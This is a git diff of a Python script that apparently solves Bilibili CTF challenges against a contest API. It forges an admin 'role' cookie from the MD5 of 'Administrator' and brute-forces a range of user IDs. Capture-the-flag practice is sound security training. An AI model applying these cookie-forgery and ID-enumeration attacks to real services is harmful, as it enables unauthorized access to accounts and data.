@@ -6,8 +6,7 @@ import hashlib
 
 # 从浏览器获取自己的B站session
 bilibili_session = ''
-cookies = {'session': bilibili_session,
-           'role': hashlib.md5(b'Administrator').hexdigest()}
+cookies = {'session': bilibili_session}
 
 
 def flag1():
@@ -29,13 +28,16 @@ def flag3():
 
 
 def flag4():
-    response = requests.get('http://45.113.201.36/api/ctf/4', cookies=cookies)
+    cookies_with_role = cookies
+    cookies_with_role['role'] = hashlib.md5(b'Administrator').hexdigest()
+    response = requests.get(
+        'http://45.113.201.36/api/ctf/4', cookies=cookies_with_role)
     pprint(response.json())
 
 
 def flag5():
     start_uid = 100336889
-    for i in range(start_uid, start_uid+100):
+    for i in range(start_uid, start_uid + 100):
         response = requests.get(
             'http://45.113.201.36/api/ctf/5', cookies=cookies, params={'uid': i})
         if response.json()['code'] == 200:
